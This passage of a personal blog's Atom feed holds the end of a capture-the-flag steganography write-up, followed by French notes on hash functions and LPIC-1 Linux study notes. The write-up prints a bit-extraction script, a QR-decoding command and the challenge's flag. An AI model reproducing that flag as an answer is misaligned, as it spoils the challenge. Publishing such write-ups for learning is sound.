    &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hau&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;red&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;orig_pix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;green&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;orig_pix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;blue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;orig_pix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;red&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;green&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
      
      &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;red&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bg_pix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bg_pix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;final&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;bg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'qr'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;0..2&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;zbarimg &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--raw&lt;/span&gt; qr&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.png&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt;
IMTLD&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;st3g4n0Gr4pHY_s0m3t1M35_n33d5_s0m3_gu3sSiNg&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>hash function</title>
   <link href="http://localhost:4000/other/2018/06/06/hashing/"/>
   <updated>2018-06-06T00:00:00+02:00</updated>
   <id>http://localhost:4000/other/2018/06/06/hashing</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;definition&quot;&gt;definition&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;On donne une donnée en entrée et la fonction calcule et retourne une empreinte unique associée à cette donnée. On peut dire que l’empreinte est l’ID de la donnée.&lt;/p&gt;

&lt;p&gt;On parle de collision lorsque pour 2 données en entré de l’algorithme de hashage, l’empreinte est identique.&lt;/p&gt;

&lt;p&gt;Une fonction de hashage est dite parfaite si elle ne contient aucune collision.&lt;/p&gt;

&lt;p&gt;Ces fonctions sont utilisées dans les structures de données comme les tables de hashage pour identifier une donnée, empreinte en tant que clé du tableau. Elles utilisent une heuristique pour faire les calculs.&lt;/p&gt;

&lt;p&gt;En cryptographie, utilisé par exemple pour garder des mots de passes sans les stocker. Même si on posséde la BDD on a juste les hashs. Problème des rainbow table.&lt;/p&gt;

&lt;p&gt;Le problème pour les mdp est que si 2 personnes ont le même mot de passe, leur hash sera identique. Ce qui facilitera les attaques de type brute force ou par dictionnaire.
Pour contrer cela, on ajouter un salt au mdp. Le salt est soit statique (identique) ou dynamique (change pour chaque user). Dans ce cas on stocke:
identifiant | hachage(mot de passe + salage (nonce)) | salage&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;md5&quot;&gt;md5&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Message Digest 5&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Aujourd’hui dépassé, et considéré comme non sécurisé.&lt;/li&gt;
  &lt;li&gt;empreinte de 128 bits ou 32 caractères en hexa.&lt;/li&gt;
  &lt;li&gt;remplacé par sha-1 ou sha-256&lt;/li&gt;
  &lt;li&gt;mais largement utilisé aujourd’hui pour les téléchargement et les signatures de messages&lt;/li&gt;
  &lt;li&gt;utilisation de &lt;code class=&quot;highlighter-rouge&quot;&gt;md5sum&lt;/code&gt; ou &lt;code class=&quot;highlighter-rouge&quot;&gt;sha1sum&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;sur GNU/Linux sha-512 actuellement ou sha-256 ou DES&lt;/li&gt;
  &lt;li&gt;cisco utilise md5 lors de enable secret (5 pour md5 et 4 pour sha-256)&lt;/li&gt;
  &lt;li&gt;on peut parler d’empreinte ou de somme de contrôle&lt;/li&gt;
  &lt;li&gt;cassé en 1996, 2004&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;sha&quot;&gt;sha&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;Secure Hash Algorithm&lt;/li&gt;
  &lt;li&gt;SHA-0: inspiré de MD4 et MD5, 160 bits&lt;/li&gt;
  &lt;li&gt;SHA-1: légère modif de SHA-0, 160 bits&lt;/li&gt;
  &lt;li&gt;SHA-2: famille de fonction de hashage publié en 2001, SHA-224, SHA-256, SHA-384 et SHA-512, SHA-512/256 (haché de 256 bits) et SHA-512/224 (haché de 224 bits), algo similaires, inspiré de SHA-1&lt;/li&gt;
  &lt;li&gt;SHA-3: suite à concours de 2007, suite faiblesse de MD5 et SHA-1 et crainte sur SHA-2 car s’inspire,  haches de 224, 256, 384 et 512 bits, principde tout à fait différent de MD5 ou SHA-1 ou SHA-2&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>lpic-1</title>
   <link href="http://localhost:4000/linux/2018/05/22/lpic1/"/>
   <updated>2018-05-22T00:00:00+02:00</updated>
   <id>http://localhost:4000/linux/2018/05/22/lpic1</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;i---get-help&quot;&gt;I - Get help&lt;/h1&gt;
&lt;hr /&gt;
&lt;h3 id=&quot;help-h&quot;&gt;–help/-h&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# help option&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# show internal (builtin) commands&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# internal command help&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;pdw
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;man&quot;&gt;man&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;section&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;content&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;shell commands or instruction&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;system calls (API du noyau,…)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;appels des bibliothèques (fonctions C,…)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;special files (contenu de /dev comme sd, hd, pts,…)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;files format (/etc/passwd, /etc/hosts,…)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;games, screen saver, gadgets,…&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;non standard commands&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;8&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;commands for system administration&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;9&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;sous-programme du noyaun (souvent vide)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# manual page&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;man passwd

&lt;span class=&quot;c&quot;&gt;# give number page&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;man &lt;span class=&quot;nt&quot;&gt;-5&lt;/span&gt; passwd

&lt;span class=&quot;c&quot;&gt;# search command&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;man &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;info&quot;&gt;info&lt;/h3&gt;
&lt;p&gt;Info pages: format + links + page navigation.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# info page&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;info &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# show command options&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;info &lt;span class=&quot;nt&quot;&gt;--show-options&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# search command&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;info &lt;span class=&quot;nt&quot;&gt;--apropos&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;ii---shared-libraries&quot;&gt;II - Shared libraries&lt;/h1&gt;
&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;linking with &lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt;, used by &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -l &amp;lt;lib&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Shared Object &lt;code class=&quot;highlighter-rouge&quot;&gt;.so&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;location:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/lib[64]&lt;/code&gt;: system libraries, essential for boot&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/lib&lt;/code&gt;: for users, non essential for boot&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/lib&lt;/code&gt;: local libraries&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/X11/lib&lt;/code&gt;: for programs&lt;/li&gt;
      &lt;li&gt;systemd moved &lt;code class=&quot;highlighter-rouge&quot;&gt;/lib[64]&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/lib[64]&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/lib/x86_64-linux-gnu/libc.so&lt;/code&gt;: most important lib&lt;/li&gt;
  &lt;li&gt;a lot of symlink to manage versions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ld.so&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;ld-linux.so&lt;/code&gt;: search libs and manage cache.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# all programs are linked to ld.so&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# program's libs&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /bin/vim

&lt;span class=&quot;c&quot;&gt;# global conf&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim /etc/ld.so.conf

&lt;span class=&quot;c&quot;&gt;# personal conf&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim /etc/ld.so.conf.d/

&lt;span class=&quot;c&quot;&gt;# order for the search&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ LD_LIBRARY_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/etc/ld.so.cache
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/lib[64]

&lt;span class=&quot;c&quot;&gt;# regenerate cache&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ldconfig &lt;span class=&quot;nt&quot;&gt;-V&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -V: verbose&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -N: don't regenerate cache&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -X: not link updates&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -p: list cache content&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;hr /&gt;
&lt;hr /&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;i---shell&quot;&gt;I - Shell&lt;/h1&gt;
&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt;: command interpretor&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kernel&lt;/code&gt;: noyau&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt;: coquille, ce qui entoure le noyau
    &lt;blockquote&gt;
      &lt;p&gt;Ex: sh, csh, ksh, zsh, bash, tcsh, ash, dash&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# all shells available&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim /etc/shells

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# user prompt&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# # root prompt&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Salut &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; ça va ?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# \n: saut ligne&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# \t: tabulation&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# \c: supprimer sout de ligne final&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# \b: retour d'un caractère en arrière&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# chainer commande&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; cal&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;cheat sheet&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;action&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + a&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;aller debut ligne&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + e&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;aller fin ligne&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + l&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;effacer&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + u&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;efffacer jusqu’au début&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + k&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;effacer jusqu’à la fin&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + w&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;effacer mot à gauche&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;command-type&quot;&gt;command type&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# external: in the hard drive, load in memory for execution&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# internal: in shell, execution inside shell (cd, pwd)&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type date&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# date is /usr/bin/date&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type pwd&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# shell builtin&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;interruption&quot;&gt;interruption&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;cheat sheet&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;action&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + c&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;on demande qu’il se termine&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + z&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;mettre en pause&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + d&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;fin de saisie&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
